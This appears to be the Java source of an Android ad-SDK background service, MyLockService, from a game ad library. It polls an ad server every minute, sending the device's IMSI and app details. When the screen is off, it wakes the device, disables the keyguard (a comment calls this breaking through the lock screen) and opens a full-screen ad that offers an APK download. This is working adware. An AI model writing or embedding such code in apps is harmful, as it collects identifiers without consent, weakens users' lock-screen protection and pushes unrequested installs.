package com.stargame.ad.service;

import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;

import org.apache.http.client.HttpClient;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreConnectionPNames;
import org.json.JSONArray;
import org.json.JSONObject;

import android.app.KeyguardManager;
import android.app.KeyguardManager.KeyguardLock;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.PowerManager;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.widget.Toast;

import com.stargame.ad.AdManager;
import com.stargame.ad.activity.DownLodaActivity;
import com.stargame.ad.activity.LockActivity;
import com.stargame.ad.entity.common.SystemInfo;
import com.stargame.ad.service.MyService.MyHandler;
import com.stargame.ad.util.http.HttpUtils;
import com.stargame.ad.util.http.HttpUtils.CallBack;

public class MyLockService extends Service {
	private int execCount = 0;
	 Timer timer =null;
	 Context context;
   @Override
   public IBinder onBind(Intent arg0) {
       return null;
   }
   
   @Override
   public int onStartCommand(Intent intent, int flags, int startId) {
       // We want this service to continue running until it is explicitly
       // stopped, so return sticky.
       //Toast.makeText(this, "Service Started", Toast.LENGTH_LONG).show();
       
       context = getApplicationContext();  
       
     //判断是否要正式去下载如果是服务端处理这里不用判断，否则这里面自行判断是否需要下载安装
     if(true){
   	  initTimeTask();
     }
     else {
   	 //this.stopService() ;
   	  Log.v("MyService", "该机器已经安装。。。。");
     }
       
       
	  return START_STICKY;
   }
	

	@Override
	public void onDestroy() {
		super.onDestroy();
		//Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
		//销毁计时器
		timer.cancel();
	}
	class MyHandler extends Handler {  
		  
       public MyHandler(Looper looper) {  
           super(looper);  
       }  
 
       @Override  
       public void handleMessage(final Message msg) {  
           super.handleMessage(msg);  
           final Bundle b = msg.getData();
           PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);  
      		 boolean isOn = pm.isScreenOn();
      		
      		 if(isOn){
      			
      			
      		 }
      		 else{
      			//获取电源管理器对象  
  		        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.SCREEN_DIM_WAKE_LOCK, "bright");  
  		        //获取PowerManager.WakeLock对象,后面的参数|表示同时传入两个值,最后的是LogCat里用的Tag  
  		        wl.acquire();  
  		        //点亮屏幕  
  		        wl.release();  
      		        //释放  
      			 //突破锁屏锁屏
      			 KeyguardManager keyguardManager = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
      			 KeyguardLock keyguardLock = keyguardManager.newKeyguardLock("");
      			 keyguardLock.disableKeyguard();
      		
      			 
      			 Intent intent = new Intent(context,LockActivity.class); 
       			 intent.putExtra("imgUrl", b.getString("imgUrl"));
       			 intent.putExtra("apkUrl", b.getString("apkUrl"));
       			 intent.putExtra("adId", b.getString("adId"));
       			 intent.putExtra("backUrl", b.getString("backUrl"));
      			 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
      			 context.startActivity(intent);
      		

      		 }
      		
	 
       }  
	};  

	/** 
	 * <初始化定时器>
	 * @创建时间 2015-8-7 下午3:14:48 
	 * @创建人：hxy
	 * @see [类、类#方法、类#成员]
	 */
	private void initTimeTask() {
		
		TimerTask task = new TimerTask(){   
		    public void run() {   
		       Message message = new Message();       
		       message.what = 1;    
		       HttpClient client = new DefaultHttpClient();
		       // 请求超时
              client.getParams().setParameter(CoreConnectionPNames.CONNECTION_TIMEOUT, 2000);
              // 读取超时
              client.getParams().setParameter(CoreConnectionPNames.SO_TIMEOUT, 2000    );
		     
		       
				try{
					HashMap<String, String> mapTemp = new HashMap<String, String>();
					SystemInfo systemInfo = SystemInfo.getInstance();
					JSONObject jsonObject = new JSONObject();
					jsonObject.put("actionName", "2");
					jsonObject.put("appKey", AdManager.appKey);
					jsonObject.put("packageName", "com.huoxian.zhong");
					jsonObject.put("packageName", getPackageName());
					//jsonObject.put("appVersion", systemInfo.getAppVersion());
					jsonObject.put("channelNo", AdManager.channelNo);
					jsonObject.put("adType", "3");
					jsonObject.put("imsi",systemInfo.getImsi());
					jsonObject.put("appName", systemInfo.getAppName());
					mapTemp.put("paramMap", jsonObject.toString());
					
					
					final HashMap<String, String> map = mapTemp;
					final String dd = "paramMap="+jsonObject.toString();
					
					HttpUtils.doPostAsyn(dd, new CallBack(){

						@Override
						public void onRequestComplete(String result) {
						
							try {
								JSONObject jsonObject  = new JSONObject(result);
								
								String entityString = jsonObject.getString("result");
								
								JSONObject entityObject =  new JSONObject(entityString);
								
								String arrayString = entityObject.getString("list");
								JSONArray array = new JSONArray(arrayString);
								if(array.length()>0){
									String adString  = array.getString(0);
									JSONObject ad =  new JSONObject(adString);
									
									final String url = ad.getString("appUrl");
									Log.v("apkUrl", url);
									 //System.out.println("activity线程ID:"+Thread.currentThread().getId());  
							        HandlerThread handlerThread = new HandlerThread("handlerThread");  
							        handlerThread.start();  
									 Message msg = new MyHandler(handlerThread.getLooper()).obtainMessage();  
				                    Bundle bundle=new Bundle();  
				                   
				                    bundle.putString("adId", ad.getString("adId"));
				                    bundle.putString("apkUrl", url);
				                    bundle.putString("imgUrl", ad.getString("imgUrl"));
				                    msg.setData(bundle);//bundle传值，耗时，效率低  
				                    msg.sendToTarget();  
								}
								
							} catch (Exception e) {
								
								e.printStackTrace();
							}
							
							
							
						}

						@Override
						public void onFailed() {
							// TODO Auto-generated method stub
							
						}
						
					});
					
				}catch(Exception e){
					
				}
		      
		    }   
		 }; 
		
	 	timer = new Timer(true);
		timer.schedule(task,35000,60000); //延时1000ms后执行，1000ms执行一次
		//timer.cancel(); //退出计时
	}

	
}
